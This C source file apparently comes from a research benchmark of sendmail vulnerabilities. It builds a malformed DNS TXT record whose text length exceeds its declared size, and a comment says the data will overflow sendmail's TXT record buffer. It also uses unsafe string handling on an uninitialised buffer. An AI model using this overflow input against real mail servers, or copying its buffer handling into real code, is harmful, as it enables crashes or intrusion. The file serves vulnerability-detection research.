
/*

MIT Copyright Notice

Copyright 2003 M.I.T.

Permission is hereby granted, without written agreement or royalty fee, to use, 
copy, modify, and distribute this software and its documentation for any 
purpose, provided that the above copyright notice and the following three 
paragraphs appear in all copies of this software.

IN NO EVENT SHALL M.I.T. BE LIABLE TO ANY PARTY FOR DIRECT, INDIRECT, SPECIAL, 
INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OF THIS SOFTWARE 
AND ITS DOCUMENTATION, EVEN IF M.I.T. HAS BEEN ADVISED OF THE POSSIBILITY OF 
SUCH DAMANGE.

M.I.T. SPECIFICALLY DISCLAIMS ANY WARRANTIES INCLUDING, BUT NOT LIMITED TO 
THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, 
AND NON-INFRINGEMENT.

THE SOFTWARE IS PROVIDED ON AN "AS-IS" BASIS AND M.I.T. HAS NO OBLIGATION TO 
PROVIDE MAINTENANCE, SUPPORT, UPDATES, ENHANCEMENTS, OR MODIFICATIONS.

$Author: tleek $
$Date: 2004/01/05 17:27:47 $
$Header: /mnt/leo2/cvs/sabo/hist-040105/sendmail/s7/create-dns-file.c,v 1.1.1.1 2004/01/05 17:27:47 tleek Exp $



*/


/*

Sendmail Copyright Notice


Copyright (c) 1998-2003 Sendmail, Inc. and its suppliers.
     All rights reserved.
Copyright (c) 1983, 1995-1997 Eric P. Allman.  All rights reserved.
Copyright (c) 1988, 1993
     The Regents of the University of California.  All rights reserved.

By using this file, you agree to the terms and conditions set
forth in the LICENSE file which can be found at the top level of
the sendmail distribution.


$Author: tleek $
$Date: 2004/01/05 17:27:47 $
$Header: /mnt/leo2/cvs/sabo/hist-040105/sendmail/s7/create-dns-file.c,v 1.1.1.1 2004/01/05 17:27:47 tleek Exp $



*/


/*

<source>

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/nameser_compat.h>
#include <arpa/nameser.h>

int create_dns_file(){

  FILE *f;
  unsigned char buf[200];
  unsigned char *p;
  unsigned char *temp;
  int i, type, len;
  
  strcat(buf,"HEADER JUNK:");
  strcat(buf,"LL.MIT.EDU");
  i = len = strlen(buf);
  p = buf + i;

  *p++ = 0;
  *p++ = 16;  /* type = T_TXT = 16 */
  *p++ = 0;
  *p++ = 1;   /* class = C_IN or 1 */
  
  p = buf + i + 4;
  len += 4;

  temp = "BLAH.MIT.EDU";
  
  strcpy(p, temp); 

  i = strlen(temp);
  p += i;
  len += i;

  *p++ = 0;
  *p++ = 16;  /* T_TXT type */
  
  *p++ = 0;
  *p++ = 1;  /* C_IN class */

  *p++ = 0;
  *p++ = 0;
  *p++ = 0;
  *p++ = 255;  /* ttl = 255 */

  *p++ = 0;
  *p++ = 20;  /* size = 20 */
  *p++ = 30;  /* txtlen = 30... this is bad: txtlen should be < size */
  
  len += 11;

  strcat(p,"This is random junk in the TXT record that will overflow (*rr)->rr_u.rr_txt");
  
  f = fopen("dns-file", "w");

  p = buf;
  for(i=0; i<len; i++, p++)
    fputc(*p, f);

  fclose(f);
  return 0;
}

/*

</source>

*/

